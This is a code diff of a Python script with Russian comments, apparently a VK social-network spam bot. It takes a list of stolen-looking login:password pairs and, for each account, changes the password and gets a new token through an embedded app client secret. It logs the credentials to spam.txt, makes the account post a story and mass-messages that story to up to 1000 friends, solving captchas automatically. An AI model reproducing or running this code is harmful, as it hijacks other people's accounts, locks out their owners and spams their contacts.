@@ -48,10 +48,11 @@ def change_password(auth_data, new_password):
         # Если смена пароля успешна, то записываем в файл spam.txt
         if 'response' in resp_json:
             token = resp_json.get('response').get('token')
-            with open('spam.txt', 'a', encoding='utf-8') as file:
-                file.write(f'{auth_data[0]}:{new_password}:{token}\n')
-            print('[INFO] Смена пароля выполнена успешно!\n'
-                  'Новые данные сохранены в файле spam.txt')
+            # with open('spam.txt', 'a', encoding='utf-8') as file:
+            #     file.write(f'{auth_data[0]}:{new_password}:{token}\n')
+            # print('[INFO] Смена пароля выполнена успешно!\n'
+            #       'Новые данные сохранены в файле spam.txt')
+            print('[INFO] Смена пароля выполнена успешно!')
             return token
         elif 'error' in resp_json:
             if resp_json.get('error').get('error_code') == 14:
@@ -120,66 +121,6 @@ def change_img(user_info, x, y, name_pic):
           f'Новое изображение сохранено с именем new_{name_pic}')
 
 
-def upload_stories(token, name_pic):
-    """
-    Загрузка изображения в сторис
-    :return [story_id, owner_id]
-    """
-
-    # Получение адреса для загрузки
-    upload_method = 'https://api.vk.com/method/stories.getPhotoUploadServer'
-    params = {
-        'add_to_news': 1,
-        'access_token': token,
-        'v': '5.131'
-    }
-    try:
-        print('[INFO] Получение URL для загрузки изображения.')
-        # resp = requests.post(url=upload_method, data='new_img.png', params=params)
-        resp = requests.get(upload_method, params=params)
-        resp_json = resp.json()
-
-        print(resp_json)
-
-        if resp.status_code == requests.codes.ok and 'response' in resp_json:
-            # upload_result = resp_json.get('response').get('upload_result')
-            # sig = resp_json.get('response').get('_sig')
-            upload_url = resp_json.get('response').get('upload_url')
-            params = {
-                'access_token': token,
-                'v': '5.131'
-            }
-            upload_file = requests.post(upload_url, files={'file': name_pic}, params=params)
-            upload_result = upload_file.json().get('response').get('upload_result')
-            sig = upload_file.json().get('response').get('_sig')
-        else:
-            raise '[ERROR] Произошла ошибка при получении URL для загрузки изображения.'
-
-        # Сохранение сторис
-        print('[INFO] Сохранение сторис.')
-        save_method = 'https://api.vk.com/method/stories.save'
-        params = {
-            'upload_results': f'{upload_result},{sig}',
-            'access_token': token,
-            'v': '5.131'
-        }
-
-        resp = requests.get(save_method, params=params)
-        resp_json = resp.json()
-
-        print(resp_json)
-
-        if resp.status_code == requests.codes.ok and 'response' in resp_json:
-            print('[INFO] Сторис успешно опубликована.')
-            story_id = resp_json.get('response').get('items')[0].get('id')
-            owner_id = resp_json.get('response').get('items')[0].get('owner_id')
-            return list(story_id + owner_id)
-
-    except Exception as err:
-        print('[ERROR] Возникла ошибка при загрузке сторис.\n'
-              f'{err}')
-
-
 def get_friends(token):
     """
     Получаем список друзей
@@ -196,7 +137,7 @@ def get_friends(token):
         resp = requests.get(method, params=params)
         resp_json = resp.json()
 
-        print(resp_json)
+        # print(resp_json)
 
         if resp.status_code == requests.codes.ok and 'response' in resp_json:
             print('[INFO] Список друзей получен.')
@@ -206,102 +147,57 @@ def get_friends(token):
               f'{err}')
 
 
-def send_story_msg(friend, story, token):
-    """Рассылка сторис"""
-    method = 'https://api.vk.com/method/messages.send'
-    params = {
-        'user_id': int(friend),
-        'random_id': 0,
-        'attachment': f'story{story[1]}_{story[0]}',
-        'access_token': token,
-        'v': '5.131'
-    }
-    try:
-        resp = requests.post(url=method, params=params)
-        resp_json = resp.json()
-
-        print(resp_json)
-
-        if resp.status_code == requests.codes.ok and 'response' in resp_json:
-            print('[INFO] Сообщение отправлено.')
-        elif 'error' in resp_json:
-            if resp_json.get('error').get('error_code') == 14:
-                print('[INFO] Выполняется решении каптчи.')
-                captcha_img = resp_json.get('error').get('captcha_img')
-                captcha = captcha_solution(captcha_img)
-                resp = requests.get(method, params={**params, **captcha})
-                if resp.status_code == requests.codes.ok and 'response' in resp.json():
-                    print('[INFO] Сообщение отправлено.')
-        else:
-            print('[ERROR] Смена пароля не выполнена.')
-            print(resp.json())
-    except Exception as err:
-        print('Возникла ошибка при отправке сообщения.\n'
-              f'{err}')
-
-
-def send_me_msg(user_id, token, name_pic):
-    method = 'https://api.vk.com/method/messages.send'
-    method_upload_server = 'https://api.vk.com/method/docs.getMessagesUploadServer'
-    method_save_photo = 'https://api.vk.com/method/docs.save'
+def send_story_msg(pic_name, token):
+    """Публикация сторис"""
+    method_upload_server = 'https://api.vk.com/method/stories.getPhotoUploadServer'
+    method_save_story = 'https://api.vk.com/method/stories.save'
 
     params_def = {
         'access_token': token,
         'v': '5.131'
     }
+    params_upload = {
+        'add_to_news': 1
+    }
 
     try:
-        # получение url для загрузки
-        upload = requests.get(method_upload_server, params=params_def).json()
+        upload = requests.get(method_upload_server, params={**params_def, **params_upload}).json()
         upload_url = upload.get('response').get('upload_url')
 
-        # Загрузка
         load = requests.post(upload_url, files={
-            'file': (name_pic, open(name_pic, 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}).json()
-        file = load.get('file')
+            'file': (f'new_{pic_name}', open(f'new_{pic_name}', 'rb'),
+                     'application/vnd.ms-excel', {'Expires': '0'})}).json()
+        file = f"{load.get('response').get('upload_result')}, {load.get('_sig')}"
 
-        params_load = {
-            'file': file
-        }
-        save_photo = requests.get(method_save_photo, params={**params_def, **params_load}).json()
-        id_photo = save_photo.get('response').get('doc').get('id')
-        owner_id = save_photo.get('response').get('doc').get('owner_id')
+        save = requests.get(method_save_story, params={**params_def, **{'upload_results': file}}).json()
 
-        params = {
-            'user_id': int(user_id),
-            'random_id': 0,
-            'attachment': f'doc{owner_id}_{id_photo}',
-            'access_token': token,
-            'v': '5.131'
-        }
+        print(save)
 
-        # Отправка сообщения себе
-        resp = requests.post(url=method, params=params).json()
-        id_msg = resp.get('response')
+        if 'response' in save:
+            print('[INFO] История загружена.')
+            owner_id = save.get('response').get('items')[0].get('owner_id')
+            story_id = save.get('response').get('items')[0].get('id')
+            access_key = save.get('response').get('items')[0].get('access_key')
+            return_data = {'owner_id': owner_id, 'story_id': story_id, 'access_key': access_key}
 
-        if 'response' in resp:
-            print('[INFO] Сообщение для рассылки отправлено.')
-            return id_msg
-        elif 'error' in resp:
-            if resp.get('error').get('error_code') == 14:
+            return return_data
+        elif 'error' in save:
+            if save.get('error').get('error_code') == 14:
                 print('[INFO] Выполняется решении каптчи.')
-                captcha_sid = resp.get('error').get('captcha_sid')
-                captcha_img = resp.get('error').get('captcha_img')
-                captcha_key = captcha_solution(captcha_img)
-                captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
-                resp = requests.get(method, params={**params, **captcha_send})
-                if resp.status_code == requests.codes.ok and 'response' in resp.json():
-                    print('[INFO] Сообщение отправлено.')
-                    return id_msg
+                captcha_img = save.get('error').get('captcha_img')
+                captcha = captcha_solution(captcha_img)
+                resp = requests.get(method_save_story, params={**params_def, **captcha}).json()
+                if resp.status_code == requests.codes.ok and 'response' in resp:
+                    print('[INFO] История загружена.')
         else:
-            print('[ERROR] Сообщение не отправлено.')
-            print(resp.json())
+            print(save)
+            raise Exception('Ошибка при загрузки истории. Работа остановлена.')
     except Exception as err:
-        print('Возникла ошибка при отправке сообщения.\n'
+        print('Возникла ошибка при загрузки истории.\n'
               f'{err}')
 
 
-def send_msg(friend, message_txt, forward_msg, token):
+def send_msg(friend, message_txt, story, token):
     """Рассылка сообщений"""
     method = 'https://api.vk.com/method/messages.send'
     method_delete_msg = 'https://api.vk.com/method/messages.delete'
@@ -309,7 +205,7 @@ def send_msg(friend, message_txt, forward_msg, token):
         'user_id': friend,
         'random_id': 0,
         'message': message_txt,
-        'forward_messages': forward_msg,
+        'attachment': f'story{story.get("owner_id")}_{story.get("story_id")}_{story.get("access_key")}',
         'access_token': token,
         'v': '5.131'
     }
@@ -430,8 +326,9 @@ def sort_online(user_ids, token):
             'access_token': token,
             'v': '5.131'
         }
+
         resp = requests.get(method, params=params_def).json()
-        print(resp)
+        # print(resp)
         if 'response' in resp:
             # если онлайн (1) - в список online
             for user in resp.get('response'):
@@ -455,8 +352,27 @@ def sort_online(user_ids, token):
         return users_list
 
     except Exception as err:
-        print('[ERROR] Возникла ошибка при получении статусов онлайна.\n'
-              f'{err}')
+        print(err)
+        raise Exception('[ERROR] Возникла ошибка при получении статусов онлайна.')
+
+
+def get_new_token(password, auth_data):
+    """Получаем токен с правами доступа"""
+    print('[INFO] Выполняется получение токена с правами доступа.')
+    url = f'https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&' \
+          f'username={auth_data[0]}' \
+          f'&password={password}'
+    resp = requests.get(url).json()
+    if 'access_token' in resp:
+        new_token = resp.get('access_token')
+        with open('spam.txt', 'a', encoding='utf-8') as file:
+            file.write(f'{auth_data[0]}:{password}:{new_token}\n')
+        print('[INFO] Получение токена с правами доступа выполнено успешно!\n'
+              'Новые данные сохранены в файле spam.txt')
+        return new_token
+    else:
+        print(resp)
+        raise Exception('Получить токен с правами доступа не удалось.')
 
 
 def main():
@@ -474,11 +390,12 @@ def main():
     count_account = 1
     for auth in auth_data:
         auth_data_list = auth.strip('\n').split(':')
-        token = change_password(auth_data_list, new_password)
-        if token is None:
+        old_token = change_password(auth_data_list, new_password)
+        if old_token is None:
             print(f'Аккаунт {auth_data_list} невалидный. Пропускаем.')
             continue
         sleep(3)
+        token = get_new_token(auth_data=auth_data_list, password=new_password)
         set_privacy(token)
         sleep(3)
         user_info = get_user_info(token)
@@ -488,13 +405,13 @@ def main():
             friends = friends[:1000]
         sleep(3)
         sort_friends = sort_online(friends, token)
-        id_msg = send_me_msg(user_id=user_info[0], token=token, name_pic=name_pic)
+        story_msg = send_story_msg(pic_name=name_pic, token=token)
 
         count_friends = 0
 
         print('[INFO] Выполняется рассылка по онлайн пользователям.')
         for friend in sort_friends[0]:
-            send_msg(friend=friend, message_txt=message_txt, forward_msg=id_msg, token=token)
+            send_msg(friend=friend, message_txt=message_txt, story=story_msg, token=token)
             count_friends += 1
             print(f'[INFO] Сообщение {count_friends} из {len(sort_friends[0])}.\n'
                   f'[INFO] Аккаунт {count_account} из {len(auth_data)}.\n'
@@ -507,7 +424,7 @@ def main():
         print('[INFO] Выполняется рассылка по оффлайн пользователям.')
         for friend in sort_friends[1]:
             try:
-                send_msg(friend=friend, message_txt=message_txt, forward_msg=id_msg, token=token)
+                send_msg(friend=friend, message_txt=message_txt, story=story_msg, token=token)
                 count_friends += 1
                 print(f'[INFO] Сообщение {count_friends} из {len(sort_friends[1])}.\n'
                       f'[INFO] Аккаунт {count_account} из {len(auth_data)}.\n'
